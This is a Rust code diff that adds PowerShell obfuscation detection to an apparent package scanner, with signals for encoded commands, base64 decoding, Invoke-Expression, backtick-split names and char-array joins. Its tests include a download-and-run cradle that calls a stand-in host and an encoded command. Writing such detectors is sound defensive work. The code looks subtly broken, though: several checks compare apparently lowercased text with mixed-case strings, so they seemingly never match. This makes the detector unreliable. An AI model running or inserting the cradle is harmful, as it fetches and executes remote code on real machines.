@@ -37,6 +37,9 @@ pub enum Lang {
     Perl,
     /// Shell (sh/bash/zsh) - covers OS-package install hooks.
     Shell,
+    /// PowerShell (`ps1`/`psm1`) - Chocolatey packages ARE PowerShell scripts,
+    /// and Windows install hooks live here.
+    PowerShell,
     Lua,
 }
 
@@ -53,6 +56,7 @@ impl Lang {
         Lang::Cpp,
         Lang::Perl,
         Lang::Shell,
+        Lang::PowerShell,
         Lang::Lua,
     ];
 
@@ -68,6 +72,7 @@ impl Lang {
             Lang::Cpp => &["c", "h", "cpp", "cc", "cxx", "hpp", "hh", "hxx"],
             Lang::Perl => &["pl", "pm", "t"],
             Lang::Shell => &["sh", "bash", "zsh", "ksh"],
+            Lang::PowerShell => &["ps1", "psm1", "psd1"],
             Lang::Lua => &["lua"],
         }
     }
@@ -80,6 +85,12 @@ fn hex_run_re() -> &'static Regex {
 fn unicode_run_re() -> &'static Regex {
     static R: OnceLock<Regex> = OnceLock::new();
     R.get_or_init(|| Regex::new(r"(?:\\u[0-9a-fA-F]{4}){6,}").unwrap())
+}
+/// A backtick between two word characters — PowerShell's escape character
+/// applied where it changes nothing but a literal string search.
+fn backtick_split_re() -> &'static Regex {
+    static R: OnceLock<Regex> = OnceLock::new();
+    R.get_or_init(|| Regex::new(r"\w`\w").unwrap())
 }
 fn base64_re() -> &'static Regex {
     static R: OnceLock<Regex> = OnceLock::new();
@@ -128,6 +139,29 @@ fn scan_file(path: &Path, text: &str, out: &mut Vec<Finding>, lang: Lang) {
             }
             if lower.contains("atob(") {
                 signals.push("atob() base64 decode");
+            }
+        }
+        Lang::PowerShell => {
+            // `-EncodedCommand` takes base64 UTF-16LE. Legitimate in tooling,
+            // but in a package's install script it is a payload carrier.
+            if lower.contains("-EncodedCommand") || lower.contains(" -enc ") {
+                signals.push("-EncodedCommand");
+            }
+            if lower.contains("FromBase64String") {
+                signals.push("base64/codecs decode");
+            }
+            if lower.contains("Invoke-Expression") || lower.contains("iex ") {
+                signals.push("Invoke-Expression");
+            }
+            // A backtick between two word characters: PowerShell's escape is a
+            // no-op there, so `I`E`X` still runs as IEX while defeating a
+            // literal search. Nothing legitimate writes cmdlet names that way.
+            if backtick_split_re().is_match(lower) {
+                signals.push("backtick-split identifier");
+            }
+            // Rebuilding a string from character codes to keep it out of the file.
+            if lower.contains("[char[]]") || (lower.contains("[char]") && lower.contains("-join")) {
+                signals.push("char array join");
             }
         }
         Lang::Python => {
@@ -358,4 +392,54 @@ fn looks_minified(text: &str) -> bool {
     let max_line = text.lines().map(|l| l.len()).max().unwrap_or(0);
     let banner = text.starts_with("/*!") || text.contains("//# sourceMappingURL=");
     max_line > 2000 && banner
+}
+
+#[cfg(test)]
+mod ps_tests {
+    use super::*;
+
+    fn scan_one(file: &str, content: &str) -> Vec<Finding> {
+        let dir = std::env::temp_dir().join(format!("pm-obf-ps-{}-{file}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(dir.join(file), content).unwrap();
+        let mut out = Vec::new();
+        scan_dir(&dir, &mut out, Lang::PowerShell);
+        std::fs::remove_dir_all(&dir).ok();
+        out
+    }
+
+    /// PowerShell's escape character is a no-op between word characters, so
+    /// `I`E`X` runs as IEX while defeating a literal search for it. This is the
+    /// tell a shell-flavoured pattern set would never have caught.
+    #[test]
+    fn a_backtick_split_identifier_is_obfuscation() {
+        let f = scan_one(
+            "evil.ps1",
+            &format!("{}\nI`E`X (New-Object Net.WebClient).DownloadString('http://x.test/a')\n", "# ".repeat(40)),
+        );
+        assert!(!f.is_empty(), "should flag");
+        assert!(f[0].detail.contains("backtick-split identifier"), "{}", f[0].detail);
+    }
+
+    #[test]
+    fn an_encoded_command_is_a_payload_carrier() {
+        let f = scan_one(
+            "enc.ps1",
+            &format!("{}\npowershell -EncodedCommand SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQA\n", "# ".repeat(40)),
+        );
+        assert!(f.iter().any(|x| x.detail.contains("-EncodedCommand")), "got {f:?}");
+    }
+
+    /// An ordinary install script must stay quiet, or the signal is worthless.
+    #[test]
+    fn an_ordinary_install_script_is_not_flagged() {
+        let f = scan_one(
+            "chocolateyInstall.ps1",
+            "$ErrorActionPreference = 'Stop'\n\
+             $toolsDir = Split-Path -parent $MyInvocation.MyCommand.Definition\n\
+             $packageArgs = @{ packageName = 'jq'; fileFullPath = $toolsDir }\n\
+             Install-ChocolateyPackage @packageArgs\n",
+        );
+        assert!(f.is_empty(), "got {f:?}");
+    }
 }
